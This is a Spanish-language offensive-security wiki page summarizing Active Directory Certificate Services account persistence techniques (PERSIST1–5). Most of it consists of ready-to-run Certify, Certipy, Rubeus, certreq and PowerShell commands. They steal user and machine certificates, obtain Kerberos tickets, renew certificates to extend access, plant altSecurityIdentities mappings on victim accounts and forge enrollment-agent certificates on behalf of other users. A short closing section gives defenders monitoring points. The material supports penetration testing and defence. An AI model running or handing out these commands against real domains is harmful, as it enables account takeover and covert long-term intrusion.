# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Este es un pequeño resumen de los capítulos de persistencia de cuentas de la increíble investigación de [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Comprendiendo el robo de credenciales de usuario activas con certificados – PERSIST1

En un escenario donde un certificado que permite la autenticación de dominio puede ser solicitado por un usuario, un atacante tiene la oportunidad de solicitar y robar este certificado para mantener la persistencia en una red. Por defecto, la plantilla `User` en Active Directory permite tales solicitudes, aunque a veces puede estar deshabilitada.

Usando [Certify](https://github.com/GhostPack/Certify) o [Certipy](https://github.com/ly4k/Certipy), puedes buscar plantillas habilitadas que permitan la autenticación de clientes y luego solicitar una:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
El poder de un certificado radica en su capacidad para autenticar como el usuario al que pertenece, independientemente de los cambios de contraseña, siempre que el certificado siga siendo válido.

Puedes convertir PEM a PFX y usarlo para obtener un TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Nota: Combinado con otras técnicas (ver secciones de THEFT), la autenticación basada en certificados permite acceso persistente sin tocar LSASS e incluso desde contextos no elevados.

## Obtención de Persistencia en la Máquina con Certificados - PERSIST2

Si un atacante tiene privilegios elevados en un host, puede inscribir la cuenta de máquina del sistema comprometido para un certificado utilizando la plantilla `Machine` predeterminada. Autenticarse como la máquina habilita S4U2Self para servicios locales y puede proporcionar persistencia duradera en el host:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Extending Persistence Through Certificate Renewal - PERSIST3

Abusar de los períodos de validez y renovación de las plantillas de certificados permite a un atacante mantener el acceso a largo plazo. Si posees un certificado emitido anteriormente y su clave privada, puedes renovarlo antes de su expiración para obtener una nueva credencial de larga duración sin dejar artefactos de solicitud adicionales vinculados al principal original.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Consejo operativo: Realice un seguimiento de la duración de los archivos PFX en poder del atacante y renueve con anticipación. La renovación también puede hacer que los certificados actualizados incluyan la extensión de mapeo SID moderno, manteniéndolos utilizables bajo reglas de mapeo de DC más estrictas (ver la siguiente sección).

## Plantando Mapeos de Certificado Explícitos (altSecurityIdentities) – PERSIST4

Si puede escribir en el atributo `altSecurityIdentities` de una cuenta objetivo, puede mapear explícitamente un certificado controlado por el atacante a esa cuenta. Esto persiste a través de cambios de contraseña y, al usar formatos de mapeo fuertes, sigue siendo funcional bajo la aplicación moderna de DC.

Flujo de alto nivel:

1. Obtenga o emita un certificado de autenticación de cliente que controle (por ejemplo, inscriba la plantilla `User` como usted mismo).
2. Extraiga un identificador fuerte del certificado (Issuer+Serial, SKI o SHA1-PublicKey).
3. Agregue un mapeo explícito en el `altSecurityIdentities` del principal víctima utilizando ese identificador.
4. Autentíquese con su certificado; el DC lo mapea a la víctima a través del mapeo explícito.

Ejemplo (PowerShell) utilizando un mapeo fuerte de Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Luego autentíquese con su PFX. Certipy obtendrá un TGT directamente:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```
Notas
- Utilice solo tipos de mapeo fuertes: X509IssuerSerialNumber, X509SKI o X509SHA1PublicKey. Los formatos débiles (Subject/Issuer, solo Subject, correo electrónico RFC822) están en desuso y pueden ser bloqueados por la política de DC.
- La cadena de certificados debe construirse hasta una raíz confiable por el DC. Las CAs empresariales en NTAuth suelen ser confiables; algunos entornos también confían en CAs públicas.

Para más información sobre mapeos explícitos débiles y rutas de ataque, consulte:

{{#ref}}
domain-escalation.md
{{#endref}}

## Agente de Inscripción como Persistencia – PERSIST5

Si obtiene un certificado válido de Agente de Solicitud de Certificado/Agente de Inscripción, puede emitir nuevos certificados capaces de iniciar sesión en nombre de los usuarios a voluntad y mantener el PFX del agente fuera de línea como un token de persistencia. Flujo de abuso:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
La revocación del certificado del agente o los permisos de plantilla es necesaria para desalojar esta persistencia.

## 2025 Aplicación de Mapeo de Certificados Fuertes: Impacto en la Persistencia

Microsoft KB5014754 introdujo la Aplicación de Mapeo de Certificados Fuertes en controladores de dominio. Desde el 11 de febrero de 2025, los DCs predeterminan la Aplicación Completa, rechazando mapeos débiles/ambiguos. Implicaciones prácticas:

- Los certificados anteriores a 2022 que carecen de la extensión de mapeo SID pueden fallar en el mapeo implícito cuando los DCs están en Aplicación Completa. Los atacantes pueden mantener el acceso renovando certificados a través de AD CS (para obtener la extensión SID) o plantando un mapeo explícito fuerte en `altSecurityIdentities` (PERSIST4).
- Los mapeos explícitos que utilizan formatos fuertes (Emisor+Serie, SKI, SHA1-ClavePública) continúan funcionando. Los formatos débiles (Emisor/Sujeto, Solo-sujeto, RFC822) pueden ser bloqueados y deben evitarse para la persistencia.

Los administradores deben monitorear y alertar sobre:
- Cambios en `altSecurityIdentities` y la emisión/renovaciones de certificados de Agente de Inscripción y Usuario.
- Registros de emisión de CA para solicitudes en nombre de y patrones de renovación inusuales.

## Referencias

- Microsoft. KB5014754: Cambios en la autenticación basada en certificados en controladores de dominio de Windows (cronograma de aplicación y mapeos fuertes).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy Wiki – Referencia de Comandos (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference

{{#include ../../../banners/hacktricks-training.md}}
